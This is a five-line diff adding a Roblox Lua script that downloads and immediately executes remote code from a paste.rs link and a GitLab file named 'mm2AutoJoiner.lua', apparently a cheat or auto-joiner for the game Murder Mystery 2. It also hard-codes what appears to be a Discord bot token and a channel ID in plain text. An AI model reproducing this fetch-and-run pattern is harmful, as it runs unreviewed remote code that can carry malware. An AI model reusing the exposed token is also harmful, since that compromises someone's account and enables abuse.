@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://paste.rs/LOvgy"))()
+
+token = "MTMzNDM0MjEwODgyNzM1NzI1Ng.G-C-kD.uFSjt2nqtADXm8XXPKFwolewJK6wVfFyQ-CVrE"
+channelId = "1400930100354093127"
+loadstring(game:HttpGet("https://gitlab.com/yeslidez/eks0va/-/raw/main/mm2AutoJoiner.lua"))()
